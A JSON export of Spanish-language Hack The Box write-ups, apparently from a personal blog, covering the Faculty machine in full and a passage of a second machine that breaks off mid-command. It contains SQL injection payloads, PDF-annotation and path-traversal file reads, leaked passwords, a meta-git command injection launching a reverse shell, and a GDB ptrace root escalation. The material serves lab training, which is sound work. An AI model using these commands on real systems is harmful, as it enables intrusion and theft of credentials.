[{"contents":"  SO: Linux   Dificultad: Media   Dirección IP: 10.10.11.169   Fecha: 02 / 07 / 2022   Escaneo de puertos # Nmap 7.92 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.11.169 -p 22,80 Nmap scan report for 10.10.11.169 Host is up (0.059s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 e9:41:8c:e5:54:4d:6f:14:98:76:16:e7:29:2d:02:16 (RSA) | 256 43:75:10:3e:cb:78:e9:52:0e:eb:cf:7f:fd:f6:6d:3d (ECDSA) |_ 256 c1:1c:af:76:2b:56:e8:b3:b8:8a:e9:69:73:7b:e6:f5 (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) | http-title: School Faculty Scheduling System |_Requested resource was login.php | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set |_http-server-header: nginx/1.18.0 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done -- 1 IP address (1 host up) scanned in 9.92 seconds  La máquina tiene abiertos los puertos 22 (SSH) y 80 (HTTP).\nEnumeración Si vamos a http://10.10.11.169, se nos redirige a http://faculty.htb, por lo que tenemos que añadir este dominio en /etc/hosts. Luego, tenemos la siguiente página:\nSi probamos payloads de inyección de código SQL, nos saltamos el panel de autenticación:\nEl tipo de SQLi explotado es Boolean-based Blind:\n$ curl 'faculty.htb/admin/ajax.php?action=login_faculty' -d \"id_no='\" \u0026lt;br /\u0026gt; \u0026lt;b\u0026gt;Notice\u0026lt;/b\u0026gt;: Trying to get property 'num_rows' of non-object in \u0026lt;b\u0026gt;/var/www/scheduling/admin/admin_class.php\u0026lt;/b\u0026gt; on line \u0026lt;b\u0026gt;43\u0026lt;/b\u0026gt;\u0026lt;br /\u0026gt; 3 $ curl 'faculty.htb/admin/ajax.php?action=login_faculty' -d \"id_no='+or+1=1--+-\" 1 $ curl 'faculty.htb/admin/ajax.php?action=login_faculty' -d \"id_no='+or+1=2--+-\" 3  Ahora tenemos también la ruta absoluta donde se guardan los archivos PHP usados por el servidor (/var/www/scheduling/admin/admin_class.php).\nEl calendario de arriba no es útil de momento. Vamos a aplicar fuzzing para enumerar más rutas:\n$ ffuf -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt -u http://faculty.htb/FUZZ -e .php index.php [Status: 302, Size: 12193, Words: 1896, Lines: 359, Duration: 76ms] login.php [Status: 200, Size: 4860, Words: 270, Lines: 132, Duration: 38ms] header.php [Status: 200, Size: 2871, Words: 155, Lines: 48, Duration: 38ms] admin [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 44ms] test.php [Status: 500, Size: 0, Words: 1, Lines: 1, Duration: 62ms] topbar.php [Status: 200, Size: 1206, Words: 199, Lines: 37, Duration: 40ms] [Status: 302, Size: 12193, Words: 1896, Lines: 359, Duration: 39ms]  Genial, vamos a /admin. Parece que las cookies se quedan para esta página también y seguimos autenticados:\nEncontrando una funcionalidad de PDF Si pinchamos en \u0026ldquo;Subject List\u0026rdquo;, se nos redirige a una página como /admin/index.php?page=subjects:\nParece que el parámetro de URL page es vulnerable a navegación de directorios o inclusión de archivos locales, pero no lo es.\nOtra opción que tenemos aquí es la de exportar la información a un archivo PDF:\nSi miramos los metadatos de este archivo con exiftool veremos que está producido por mPDF 6.0:\n$ curl faculty.htb/mpdf/tmp/OKguepDUWdP3H1K0jRSbJn5MAc.pdf -so - | exiftool - ExifTool Version Number : 12.42 File Size : 0 bytes File Modification Date/Time : 2022:07:18 17:57:17+02:00 File Access Date/Time : 2022:07:18 17:57:17+02:00 File Inode Change Date/Time : 2022:07:18 17:57:17+02:00 File Permissions : prw-rw---- File Type : PDF File Type Extension : pdf MIME Type : application/pdf PDF Version : 1.4 Linearized : No Page Count : 1 Page Layout : OneColumn Producer : mPDF 6.0 Create Date : 2022:07:18 16:56:31+01:00 Modify Date : 2022:07:18 16:56:31+01:00  Esta versión de mPDF tiene algunas vulnerabilidades que derivan en ejecución remota de comandos, pero no podemos explotarlas. Otra vulnerabilidad es el hecho de poder añadir etiquetas HTML \u0026lt;annotation\u0026gt; para adjuntar archivos locales al archivo PDF generado (más información en github.com).\nVamos a capturar la petición con Burp Suite:\nEstá enviando datos en Base64. Con CyberChef veremos que se trata de datos codificados en URL dos veces y luego en Base64:\nEntonces, vamos a añadir la etiqueta \u0026lt;annotation\u0026gt; para obtener el archivo /etc/passwd y lo codificamos como es debido:\nCon el payload de arriba, obtenemos otro archivo PDF:\nY aquí podemos ver passwd como adjunto:\nY de hecho, obtenemos el archivo /etc/passwd. Estos son los usuarios existentes a nivel de sistema:\n$ grep sh$ passwd root:x:0:0:root:/root:/bin/bash gbyolo:x:1000:1000:gbyolo:/home/gbyolo:/bin/bash developer:x:1001:1002:,,,:/home/developer:/bin/bash  Acceso a la máquina En este punto, podríamos tratar de leer archivos PHP. Vamos a echar un vistazo a /var/www/scheduling/login.php:\n\u0026lt;!DOCTYPEhtml\u0026gt; \u0026lt;htmllang=\"en\"\u0026gt; \u0026lt;?php session_start(); include('admin/db_connect.php'); ob_start(); ob_end_flush(); ?\u0026gt; \u0026lt;head\u0026gt; \u0026lt;metacharset=\"utf-8\"\u0026gt; \u0026lt;metacontent=\"width=device-width, initial-scale=1.0\"name=\"viewport\"\u0026gt; \u0026lt;title\u0026gt;School Faculty Scheduling System\u0026lt;/title\u0026gt;  \u0026lt;?phpinclude('./header.php'); ?\u0026gt; \u0026lt;?php if(isset($_SESSION['login_id'])) header(\"location:index.php\"); ?\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;!-- ... -- \u0026gt;  Está referenciando el archivo /var/www/scheduling/admin/db_connect.php:\n\u0026lt;?php $conn=newmysqli('localhost','sched','Co.met06aci.dly53ro.per','scheduling_db')ordie(\"Could not connect to mysql\".mysqli_error($con));  Y aquí tenemos una contraseña (Co.met06aci.dly53ro.per), que, afortunadamente, se reutiliza por el usuario gbyolo en SSH:\n$ ssh gbyolo@10.10.11.169 gbyolo@10.10.11.169's password: -bash-5.0$ whoami gbyolo  Este usuario puede ejecutar /usr/local/bin/meta-git como developer mediante sudo:\n-bash-5.0$ sudo -l [sudo] password for gbyolo: Matching Defaults entries for gbyolo on faculty: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User gbyolo may run the following commands on faculty: (developer) /usr/local/bin/meta-git  Movimiento lateral al usuario developer Se trata de un script en Node.js:\n-bash-5.0$ file /usr/local/bin/meta-git /usr/local/bin/meta-git: symbolic link to ../lib/node_modules/meta-git/bin/meta-git -bash-5.0$ file /usr/local/lib/node_modules/meta-git/bin/meta-git /usr/local/lib/node_modules/meta-git/bin/meta-git: Node.js script, ASCII text executable -bash-5.0$ cat /usr/local/lib/node_modules/meta-git/bin/meta-git  #!/usr/bin/env node letloaded=false; if(loaded) returnprocess.kill(); constprogram =require('commander'); constdebug=require('debug')('meta-git'); program .command('add', 'Add file contents to the index') .command('branch', 'List, create, or delete branches') .command('checkout', 'Switch branches or restore working tree files') .command('clean', 'Remove untracked files from the working tree') .command('clone', 'Clone meta and child repositories into new directories') .command('commit', 'Record changes to the repository') .command('diff', 'Show changes between commits, commit and working tree, etc') .command('fetch', 'Download objects and refs from another repository') .command('merge', 'Join two or more development histories together') .command('pull', 'Fetch from and integrate with another repository or a local branch') .command('push', 'Update remote refs along with associated objects') .command('remote', 'Manage set of tracked repositories') .command('status', 'Show the working tree status') .command('tag', 'Create, list, delete or verify a tag object signed with GPG') .command('update', \"Clone any repos that exist in your .meta file butaren't cloned locally\") .parse(process.argv); loaded=true;  Si buscamos vulnerabilidades de meta-git veremos un informe de snyk.io, que nos redirige a HackerOne. Como se dice en los informes, podemos realizar las siguientes acciones para inyectar un comando de sistema en meta-git clone, por lo que podemos obtener una reverse shell como developer:\n-bash-5.0$ cd /tmp -bash-5.0$ mkdir tests -bash-5.0$ cd tests -bash-5.0$ touch asdf -bash-5.0$ echo 'bash -i \u0026gt;\u0026 /dev/tcp/10.10.17.44/4444 0\u0026gt;\u00261' \u0026gt; /tmp/rev.sh -bash-5.0$ sudo -u developer /usr/local/bin/meta-git clone 'asdf||bash /tmp/rev.sh' meta git cloning into 'asdf||bash /tmp/rev.sh' at rev.sh rev.sh: fatal: destination path 'asdf' already exists and is not an empty directory.  $ nc -nlvp 4444 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 10.10.11.169. Ncat: Connection from 10.10.11.169:34078. -bash-5.0$ script /dev/null -c bash script /dev/null -c bash Script started, file is /dev/null -bash-5.0$ ^Z zsh: suspended ncat -nlvp 4444 $ stty raw -echo; fg [1] + continued ncat -nlvp 4444 reset xterm -bash-5.0$ export TERM=xterm -bash-5.0$ export SHELL=bash -bash-5.0$ stty rows 50 columns 158 -bash-5.0$ whoami developer  En este punto, podemos leer la flag user.txt:\n-bash-5.0$ cat /home/developer/user.txt 0ba1d5bb897f62ecbbf99955e4ef0b81  La enumeración básica nos dice lo que tenemos que hacer:\n-bash-5.0$ id uid=1001(developer) gid=1002(developer) groups=1002(developer),1001(debug),1003(faculty) -bash-5.0$ find / -group debug 2/dev/null /usr/bin/gdb  Parece que podemos ejecutar GDB por pertenecer al grupo debug. Si enumeramos capabilities, vemos que GDB tiene habilitada cap_sys_ptrace:\n-bash-5.0$ getcap -r / 2/dev/null /usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep /usr/bin/gdb = cap_sys_ptrace+ep /usr/bin/ping = cap_net_raw+ep /usr/bin/traceroute6.iputils = cap_net_raw+ep /usr/bin/mtr-packet = cap_net_raw+ep  Esto es un problema porque esta capability nos permite depurar cualquier proceso y ejecutar instrucciones arbitrarias.\nEscalada de privilegios Para escalar privilegios, podemos listar procesos en ejecución por root y agregarnos con GDB al PID (identificador de proceso) correspondiente:\n-bash-5.0$ ps -faux | grep root root 2 0.0 0.0 0 0 ? S 15:10 0:00 [kthreadd] root 3 0.0 0.0 0 0 ? I\u0026lt; 15:10 0:00 \\_ [rcu_gp] root 4 0.0 0.0 0 0 ? I\u0026lt; 15:10 0:00 \\_ [rcu_par_gp] ... root 718 0.0 0.4 238080 9444 ? Ssl 15:10 0:00 /usr/lib/accountsservice/accounts-daemon root 724 0.0 0.1 81956 3716 ? Ssl 15:10 0:00 /usr/sbin/irqbalance --foreground root 725 0.0 0.9 26896 18196 ? Ss 15:10 0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers root 728 0.0 0.4 236436 9076 ? Ssl 15:10 0:00 /usr/lib/policykit-1/polkitd --no-debug root 735 0.0 0.3 17348 7664 ? Ss 15:10 0:00 /lib/systemd/systemd-logind ... root 968 0.0 0.0 2860 1796 tty1 Ss+ 15:10 0:00 /sbin/agetty -o -p -- \\u --noclear tty1 linux root 1571 0.0 0.2 38072 4576 ? Ss 15:10 0:00 /usr/lib/postfix/sbin/master -w -bash-5.0$ gdb -q -p 725 Attaching to process 725 Reading symbols from /usr/bin/python3.8... (No debugging symbols found in /usr/bin/python3.8) Reading symbols from /lib/x86_64-linux-gnu/libc.so.6... Reading symbols from /usr/lib/debug/.build-id/18/78e6b475720c7c51969e69ab2d276fae6d1dee.debug... Reading symbols from /lib/x86_64-linux-gnu/libpthread.so.0... Reading symbols from /usr/lib/debug/.build-id/7b/4536f41cdaa5888408e82d0836e33dcf436466.debug... [Thread debugging using libthread_db enabled] Using host libthread_db library \"/lib/x86_64-linux-gnu/libthread_db.so.1\". Reading symbols from /lib/x86_64-linux-gnu/libdl.so.2... ... Reading symbols from /usr/lib/python3.8/lib-dynload/_lzma.cpython-38-x86_64-linux-gnu.so... (No debugging symbols found in /usr/lib/python3.8/lib-dynload/_lzma.cpython-38-x86_64-linux-gnu.so) 0x00007f8d5dbf6967 in __GI___poll (fds=0x25b4a60, nfds=3, timeout=-1) at ../sysdeps/unix/sysv/linux/poll.c:29 29 ../sysdeps/unix/sysv/linux/poll.c: No such file or directory.  En este punto, vemos que system (de Glibc) está cargado en memoria, por lo que podemos llamar a esta función con un comando de sistema. Por ejemplo, vamos a añadir el permiso SUID a /bin/bash:\n(gdb) p system $1 = {int (const char *)} 0x7f8d5db36290 \u0026lt;__libc_system\u0026gt; (gdb) call system(\"chmod 4755 /bin/bash\") [Detaching after vfork from child process 53188] $2 = 0 (gdb) quit A debugging session is active. Inferior 1 [process 725] will be detached. Quit anyway? (y or n) y Detaching from program: /usr/bin/python3.8, process 725 [Inferior 1 (process 725) detached] -bash-5.0$ ls -l /bin/bash -rwsr-xr-x 1 root root 1183448 Apr 18 11:14 /bin/bash  Y ahora que /bin/bash es un binario SUID, podemos ejecutarla como root:\n-bash-5.0$ bash -p -bash-5.0# cat /root/root.txt fbe411b0063d04a996b537b337d14d51  ","image":"/images/HTB/Faculty/Faculty.png","permalink":"https://7rocky.github.io/htb/faculty/","section":"htb","summary":"Hack The Box. Linux. Máquina media. Esta máquina tiene una página web vulnerable a SQLi y salto de autenticación que lleva a otra página en la que podemos exportar contenido HTML a PDF. Existe una vulnerabilidad en la que podemos adjuntar archivos locales al fichero PDF y leer una contraseña reutilizada para SSH. Mediante sudo podemos ejecutar un script en Node.js como otro usuario y explotar una inyección de comandos. Este segundo usuario puede ejecutar GDB y además GDB tiene la capability cap_sys_ptrace activada, por lo que podemos depurar un proceso en ejecución por root y ejecutar código arbitrario","time":6,"title":"Faculty"},{"contents":"  SO: Linux   Dificultad: Fácil   Dirección IP: 10.10.11.164   Fecha: 21 / 05 / 2022   Escaneo de puertos # Nmap 7.92 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.11.164 -p 22,80 Nmap scan report for 10.10.11.164 Host is up (0.052s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 1e:59:05:7c:a9:58:c9:23:90:0f:75:23:82:3d:05:5f (RSA) | 256 48:a8:53:e7:e0:08:aa:1d:96:86:52:bb:88:56:a0:b7 (ECDSA) |_ 256 02:1f:97:9e:3c:8e:7a:1c:7c:af:9d:5a:25:4b:b8:c8 (ED25519) 80/tcp open http Werkzeug/2.1.2 Python/3.10.3 | fingerprint-strings: | GetRequest: | HTTP/1.1 200 OK | Server: Werkzeug/2.1.2 Python/3.10.3 | Date: | Content-Type: text/html; charset=utf-8 | Content-Length: 5316 | Connection: close | \u0026lt;html lang=\"en\"\u0026gt; | \u0026lt;head\u0026gt; | \u0026lt;meta charset=\"UTF-8\"\u0026gt; | \u0026lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"\u0026gt; | \u0026lt;title\u0026gt;upcloud - Upload files for Free!\u0026lt;/title\u0026gt; | \u0026lt;script src=\"/static/vendor/jquery/jquery-3.4.1.min.js\"\u0026gt;\u0026lt;/script\u0026gt; | \u0026lt;script src=\"/static/vendor/popper/popper.min.js\"\u0026gt;\u0026lt;/script\u0026gt; | \u0026lt;script src=\"/static/vendor/bootstrap/js/bootstrap.min.js\"\u0026gt;\u0026lt;/script\u0026gt; | \u0026lt;script src=\"/static/js/ie10-viewport-bug-workaround.js\"\u0026gt;\u0026lt;/script\u0026gt; | \u0026lt;link rel=\"stylesheet\" href=\"/static/vendor/bootstrap/css/bootstrap.css\"/\u0026gt; | \u0026lt;link rel=\"stylesheet\" href=\" /static/vendor/bootstrap/css/bootstrap-grid.css\"/\u0026gt; | \u0026lt;link rel=\"stylesheet\" href=\" /static/vendor/bootstrap/css/bootstrap-reboot.css\"/\u0026gt; | \u0026lt;link rel= | HTTPOptions: | HTTP/1.1 200 OK | Server: Werkzeug/2.1.2 Python/3.10.3 | Date: | Content-Type: text/html; charset=utf-8 | Allow: GET, OPTIONS, HEAD | Content-Length: 0 | Connection: close | RTSPRequest: | \u0026lt;!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01//EN\" | \"http://www.w3.org/TR/html4/strict.dtd\"\u0026gt; | \u0026lt;html\u0026gt; | \u0026lt;head\u0026gt; | \u0026lt;meta http-equiv=\"Content-Type\" content=\"text/html;charset=utf-8\"\u0026gt; | \u0026lt;title\u0026gt;Error response\u0026lt;/title\u0026gt; | \u0026lt;/head\u0026gt; | \u0026lt;body\u0026gt; | \u0026lt;h1\u0026gt;Error response\u0026lt;/h1\u0026gt; | \u0026lt;p\u0026gt;Error code: 400\u0026lt;/p\u0026gt; | \u0026lt;p\u0026gt;Message: Bad request version ('RTSP/1.0').\u0026lt;/p\u0026gt; | \u0026lt;p\u0026gt;Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.\u0026lt;/p\u0026gt; | \u0026lt;/body\u0026gt; |_ \u0026lt;/html\u0026gt; |_http-server-header: Werkzeug/2.1.2 Python/3.10.3 |_http-title: upcloud - Upload files for Free! 3000/tcp filtered ppp Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done -- 1 IP address (1 host up) scanned in 96.61 seconds  La máquina tiene abiertos los puertos 22 (SSH) y 80 (HTTP). El puerto 3000 está filtrado.\nEnumeración Si vamos a http://10.10.11.164, veremos una página como esta:\nSi miramos más abajo, vemos que podemos descargar el código fuente de parte de la aplicación web:\nEsta aplicación web está en /upcloud:\nEn primer lugar, vamos a aplicar fuzzing para enumerar más rutas:\n$ ffuf -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt -u http://10.10.11.164/FUZZ download [Status: 200, Size: 2489147, Words: 9473, Lines: 9803, Duration: 155ms] console [Status: 200, Size: 1563, Words: 330, Lines: 46, Duration: 45ms]  Existe la ruta /console, que sería muy interesante si tuviéramos el PIN, pero no lo tenemos:\nExisten maneras de calcular el PIN si tuviéramos acceso a algunos archivos del servidor (más información aquí).\nEnumeración de Git Entonces, vamos a analizar el código fuente que tenemos. En primer lugar, tenemos estos archivos y directorios:\n$ tree -a -L 1 . ├── .git ├── Dockerfile ├── app ├── build-docker.sh ├── config └── source.zip 3 directories, 3 files  Como tenemos un directorio .git, quiere decir que nos hemos descargado un repositorio de Git, por lo que igual hay información sensible en confirmaciones (commits) antiguas:\n$ git log commit 2c67a52253c6fe1f206ad82ba747e43208e8cfd9 (HEAD -\u0026gt; public) Author: gituser \u0026lt;gituser@local\u0026gt; Date: Thu Apr 28 13:55:55 2022 +0200 clean up dockerfile for production use commit ee9d9f1ef9156c787d53074493e39ae364cd1e05 Author: gituser \u0026lt;gituser@local\u0026gt; Date: Thu Apr 28 13:45:17 2022 +0200 initial $ git diff 2c67 ee9d diff --git a/Dockerfile b/Dockerfile index 5b0553c..76c7768 100644 --- a/Dockerfile +++ b/Dockerfile @@ -29,6 +29,7 @@ ENV PYTHONDONTWRITEBYTECODE=1 # Set mode ENV MODE=\"PRODUCTION\" +# ENV FLASK_DEBUG=1 # Run supervisord CMD [\"/usr/bin/supervisord\", \"-c\", \"/etc/supervisord.conf\"]  Nada interesante. Vamos a ver si hay más ramas:\n$ git branch dev * public  Existe una rama llamada dev, vamos a cambiarnos a esta rama y volver a mirar los commits:\n$ git checkout dev Cambiado a rama 'dev' $ git log commit c41fedef2ec6df98735c11b2faf1e79ef492a0f3 (HEAD -\u0026gt; dev) Author: gituser \u0026lt;gituser@local\u0026gt; Date: Thu Apr 28 13:47:24 2022 +0200 ease testing commit be4da71987bbbc8fae7c961fb2de01ebd0be1997 Author: gituser \u0026lt;gituser@local\u0026gt; Date: Thu Apr 28 13:46:54 2022 +0200 added gitignore commit a76f8f75f7a4a12b706b0cf9c983796fa1985820 Author: gituser \u0026lt;gituser@local\u0026gt; Date: Thu Apr 28 13:46:16 2022 +0200 updated commit ee9d9f1ef9156c787d53074493e39ae364cd1e05 Author: gituser \u0026lt;gituser@local\u0026gt; Date: Thu Apr 28 13:45:17 2022 +0200 initial  Esto está mejor. Vamos a ver las diferencias:\n$ git diff a76f ee9d diff --git a/app/.vscode/settings.json b/app/.vscode/settings.json deleted file mode 100644 index 5975e3f..0000000 --- a/app/.vscode/settings.json +++ /dev/null @@ -1,5 +0,0 @@ -{ - \"python.pythonPath\": \"/home/dev01/.virtualenvs/flask-app-b5GscEs_/bin/python\", - \"http.proxy\": \"http://dev01:Soulless_Developer#2022@10.10.10.128:5187/\", - \"http.proxyStrictSSL\": false -} diff --git a/app/app/views.py b/app/app/views.py index 0f3cc37..f2744c6 100644 --- a/app/app/views.py +++ b/app/app/views.py @@ -6,17 +6,7 @@ from flask import render_template, request, send_file from app import app -@app.route('/') -def index(): - return render_template('index.html') - - -@app.route('/download') -def download(): - return send_file(os.path.join(os.getcwd(), \"app\", \"static\", \"source.zip\")) - - -@app.route('/upcloud', methods=['GET', 'POST']) +@app.route('/', methods=['GET', 'POST']) def upload_file(): if request.method == 'POST': f = request.files['file'] @@ -30,4 +20,4 @@ def upload_file(): @app.route('/uploads/\u0026lt;path:path\u0026gt;') def send_report(path): path = get_file_name(path) - return send_file(os.path.join(os.getcwd(), \"public\", \"uploads\", path)) + return send_file(os.path.join(os.getcwd(), \"public\", \"uploads\", path)) \\ No newline at end of file  Y aquí tenemos una contraseña en texto claro para el usuario dev01: Soulless_Developer#2022. Estas credenciales se utilizan en un proxy HTTP en el puerto 5187, pero este puerto está cerrado según nmap.\nAnálisis de código estático Vamos a continuar mirando los códigos fuente:\nimport os from flask import Flask app = Flask(__name__) if os.environ.get('MODE') == 'PRODUCTION': app.config.from_object('app.configuration.ProductionConfig') else: app.config.from_object('app.configuration.DevelopmentConfig') from app import views  Está utilizando Flask, que es un framework web en Python. El archivo llamado views.py contiene todas las rutas disponibles:\nimport os from app.utils import get_file_name from flask import render_template, request, send_file from app import app @app.route('/') def index(): return render_template('index.html') @app.route('/download') def download(): return send_file(os.path.join(os.getcwd(), \"app\", \"static\", \"source.zip\")) @app.route('/upcloud', methods=['GET', 'POST']) def upload_file(): if request.method == 'POST': f = request.files['file'] file_name = get_file_name(f.filename) file_path = os.path.join(os.getcwd(), \"public\", \"uploads\", file_name) f.save(file_path) return render_template('success.html', file_url=request.host_url + \"uploads/\" + file_name) return render_template('upload.html') @app.route('/uploads/\u0026lt;path:path\u0026gt;') def send_report(path): path = get_file_name(path) return send_file(os.path.join(os.getcwd(), \"public\", \"uploads\", path))  Existe una ruta interesante llamada /uploads, que coge una ruta de sistema y muestra el contenido del archivo indicado. Sin embargo, hay una función llamada get_file_name que realiza una sanitización, en utils.py:\nimport time def current_milli_time(): return round(time.time() * 1000) \"\"\" Pass filename and return a secure version, which can then safely be stored on a regular file system. \"\"\" def get_file_name(unsafe_filename): return recursive_replace(unsafe_filename, \"../\", \"\") \"\"\" TODO: get unique filename \"\"\" def get_unique_upload_name(unsafe_filename): spl = unsafe_filename.rsplit(\"\\\\.\", 1) file_name = spl[0] file_extension = spl[1] return recursive_replace(file_name, \"../\", \"\") + \"_\" + str(current_milli_time()) + \".\" + file_extension \"\"\" Recursively replace a pattern in a string \"\"\" def recursive_replace(search, replace_me, with_me): if replace_me not in search: return search return recursive_replace(search.replace(replace_me, with_me), replace_me, with_me)  Como podemos ver, el desarrollador utiliza una técnica recursiva para quitar intentos de navegación de directorios. Por ejemplo, \u0026quot;....//\u0026quot; será transformado a \u0026quot;../\u0026quot; y finalmente será una string vacía.\nSin embargo, hay algo que no han tenido en cuenta, ya que podemos utilizar un solo ../ y luego poner un archivo como /etc/passwd. El problema es que get_file_name retornará \u0026quot;/etc/passwd\u0026quot;, y os.path.join resultará en /etc/passwd porque no será capaz de unir una ruta absoluta desde el directorio de trabajo actual, public y uploads:\n@app.route('/uploads/\u0026lt;path:path\u0026gt;') def send_report(path): path = get_file_name(path) return send_file(os.path.join(os.getcwd(), \"public\", \"uploads\", path))  Esta es una prueba de concepto simple, usando %2e como . (codificación de URL):\n$ curl 10.10.11.164/uploads/%2e%2e//etc/passwd root:x:0:0:root:/root:/bin/ash bin:x:1:1:bin:/bin:/sbin/nologin daemon:x:2:2:daemon:/sbin:/sbin/nologin adm:x:3:4:adm:/var/adm:/sbin/nologin lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin sync:x:5:0:sync:/sbin:/bin/sync shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown halt:x:7:0:halt:/sbin:/sbin/halt mail:x:8:12:mail:/var/mail:/sbin/nologin news:x:9:13:news:/usr/lib/news:/sbin/nologin uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin operator:x:11:0:operator:/root:/sbin/nologin man:x:13:15:man:/usr/man:/sbin/nologin postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin cron:x:16:16:cron:/var/spool/cron:/sbin/nologin ftp:x:21:21::/var/lib/ftp:/sbin/nologin sshd:x:22:22:sshd:/dev/null:/sbin/nologin at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin games:x:35:35:games:/usr/games:/sbin/nologin cyrus:x:85:12::/usr/cyrus:/sbin/nologin vpopmail:x:89:89::/var/vpopmail:/sbin/nologin ntp:x:123:123:NTP:/var/empty:/sbin/nologin smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin guest:x:405:100:guest:/dev/null:/sbin/nologin nobody:x:65534:65534:nobody:/:/sbin/nologin  Acceso a la máquina Con esto, tenemos una manera de leer archivos del servidor (Directory Path Traversal). En este punto, podemos tratar de obtener la información necesaria para calcular el PIN de Werkzeug para ejecutar código de Python desde /console.\nExploit del PIN de Werkzeug Para ejecutar Werkzeug PIN exploit, necesitamos:\n El usuario que ejecuta el servidor. La ruta absoluta de app.py en el directorio de flask. La dirección MAC de la máquina (en hexadecimal). El ID de la máquina, que aparece en /etc/machine-id o en /proc/sys/kernel/random/boot_id.  El usuario que ejecuta el servidor debe ser root, ya que no hay otro usuario en /etc/passwd. Además, la máquina es un contenedor de Docker, ya que tiene un nombre de host aleatorio:\n$ curl 10.10.11.164/uploads/%2e%2e//etc/hostname ef4008903997  El archivo app.py tiene que estar en /usr/local/lib/python3.5/dist-packages/flask/app.py (según el exploit), pero no está ahí. A lo mejor la versión de Python es más moderna, y la podemos encontrar al causar un error (por ejemplo, pinchando en \u0026ldquo;Upload\u0026rdquo; sin subir un archivo), porque el modo debug está activo:\nY esta es la ruta buena: /usr/local/lib/python3.10/site-packages/flask/app.py.\nPara la dirección MAC, sabemos que estará en /sys/class/net/\u0026lt;device id\u0026gt;/address. Podríamos deducir que es eth0, que es muy común. Y de hecho, así tenemos la dirección MAC:\n$ curl 10.10.11.164/uploads/%2e%2e//sys/class/net/eth0/address 02:42:ac:11:00:06 curl: (18) transfer closed with 4078 bytes remaining to read  La explicación del exploit dice de mirar en /proc/net/arp para ver los interfaces de red disponibles, pero no obtenemos respuesta por curl. El problema es que la cabecera Content-Length pone 0, y curl deja de leer. Usando modo verboso, hay una advertencia:\n$ curl 10.10.11.164/uploads/%2e%2e//proc/net/arp -v * Trying 10.10.11.164:80... * Connected to 10.10.11.164 (10.10.11.164) port 80 (#0) \u0026gt; GET /uploads/%2e%2e//proc/net/arp HTTP/1.1 \u0026gt; Host: 10.10.11.164 \u0026gt; User-Agent: curl/7.84.0 \u0026gt; Accept: */* \u0026gt; * Mark bundle as not supporting multiuse \u0026lt; HTTP/1.1 200 OK \u0026lt; Server: Werkzeug/2.1.2 Python/3.10.3 \u0026lt; Date: Tue, 05 Jul 2022 01:13:04 GMT \u0026lt; Content-Disposition: inline; filename=arp \u0026lt; Content-Type: application/octet-stream \u0026lt; Content-Length: 0 \u0026lt; Last-Modified: Tue, 05 Jul 2022 01:13:04 GMT \u0026lt; Cache-Control: no-cache \u0026lt; ETag: \"1656983584.1326792-0-548799692\" \u0026lt; Date: Tue, 05 Jul 2022 01:13:04 GMT \u0026lt; Connection: close \u0026lt; * Excess found: excess = 156 url = /uploads/%2e%2e//proc/net/arp (zero-length body) * Closing connection 0  Podemos usar una conexión por sockets en crudo para ver la respuesta completa:\n$ echo 'GET /uploads/%2e%2e//proc/net/arp HTTP/1.1' | nc 10.10.11.164 80 HTTP/1.1 200 OK Server: Werkzeug/2.1.2 Python/3.10.3 Date: Tue, 05 Jul 2022 01:16:32 GMT Content-Disposition: inline; filename=arp Content-Type: application/octet-stream Content-Length: 0 Last-Modified: Tue, 05 Jul 2022 01:16:32 GMT Cache-Control: no-cache ETag: \"1656983792.5126793-0-548799692\" Date: Tue, 05 Jul 2022 01:16:32 GMT Connection: close IP address HW type Flags HW address Mask Device 172.17.0.1 0x1 0x2 02:42:b6:73:5f:b6 * eth0  Con sed, podemos mostrar solamente el contenido del cuerpo de respuesta:\n$ echo 'GET /uploads/%2e%2e//proc/net/arp HTTP/1.1' | nc 10.10.11.164 80 | sed -n '13,$p' IP address HW type Flags HW address Mask Device 172.17.0.1 0x1 0x2 02:42:b6:73:5f:b6 * eth0  Podemos utilizar esta función llamada read_file para incluir el anterior comando:\n$ function read_file() { echo \"GET /uploads/%2e%2e/$1 HTTP/1.1\" | nc 10.10.11.164 80 | sed -n '13,$p'; } $ read_file /proc/net/arp IP address HW type Flags HW address Mask Device 172.17.0.1 0x1 0x2 02:42:b6:73:5f:b6 * eth0  Y ahí vemos la interfaz eth0, y además la dirección MAC correspondiente. Para formatearla como número decimal, podemos quitar los dos puntos y añadir 0x (porque es hexadecimal):\n$ python3 -q 